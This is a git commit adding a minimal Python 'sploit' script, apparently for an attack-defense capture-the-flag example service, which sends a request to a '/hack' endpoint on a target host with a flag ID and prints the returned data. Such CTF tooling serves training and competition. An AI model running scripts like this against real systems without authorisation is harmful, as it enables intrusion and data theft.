0ee1028ee850d95a36940f43e83f36a5db161132
Danil Kazakov <cmaster057@gmail.com>
2023-10-22 23:17:20 +0500

    [example] add example service, checker and sploit

---
+++ sploits/example/example.sploit.py
@@ -0,0 +1,18 @@
+#!/usr/bin/env python3
+import sys
+
+import requests
+
+
+PORT = 2222
+HOSTNAME = sys.argv[1]
+FLAG_ID = sys.argv[2]
+HACK_URL_PATTERN = "http://{hostname}:{port}/hack?username={username}"
+
+
+if __name__ == "__main__":
+    username = FLAG_ID
+    hack_url = HACK_URL_PATTERN.format(hostname=HOSTNAME, port=PORT, username=username)
+    r = requests.get(hack_url, timeout=10)
+    r.raise_for_status()
+    print(r.text)
